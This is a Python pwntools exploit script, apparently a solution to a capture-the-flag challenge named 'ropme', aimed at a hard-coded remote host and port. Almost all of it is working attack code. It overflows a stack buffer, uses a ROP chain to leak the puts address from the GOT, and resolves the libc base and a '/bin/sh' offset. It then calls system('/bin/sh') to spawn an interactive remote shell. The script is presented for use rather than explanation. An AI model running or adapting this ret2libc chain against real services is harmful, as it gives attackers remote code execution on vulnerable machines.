#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ropme --host 88.198.233.174 --port 38751
from pwn import *
from binascii import hexlify

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ropme')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '88.198.233.174'
port = int(args.PORT or 39203)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

context.terminal = ["xfce4-terminal", "-e"]
io = start()
rop = ROP(exe)

message = "ROP me outside, how 'about dah?"
# few important addresses
main_addr = 0x400626
main_puts_call_addr = 0x40063A
main_fflush_call_addr = 0x40063F
puts_got = 0x601018
puts_plt = 0x4004E0

# create the rop chain to leak some addr
rop.puts(puts_got)
rop.raw(main_fflush_call_addr)
#rop.fflush(exe.symbols['stdin'])
log.info("Generated ROP for leaking puts address\n" + rop.dump())
print (cyclic(72))
payload = cyclic(72) + rop.chain()

# leaaaaaaaaaak
io.sendlineafter(message, payload)
data = io.recv() # blank
data = io.recv() # actual addr
puts_addr = unpack(data[:-1] + "\x00" * 2)
log.success("puts address leaked: " + hex(puts_addr))

# received addr for puts had the signature 690
# using https://libc.blukat.me we see that the corresponding libc is
# libc6_2.23-0ubuntu10_amd64
libc = ELF("libc6_2.23-0ubuntu10_amd64.so")
rop = ROP(libc)

libc.address = puts_addr - libc.symbols['puts']
log.success("Leaked libc: " + hex(libc.address))

binsh_offset = 0x18CD57
binsh_addr = libc.address + binsh_offset
log.info("'/bin/sh' address: " + hex(binsh_addr))

rop.system(binsh_addr)
log.info("Generated ROP shell: " + rop.dump())

io.interactive()
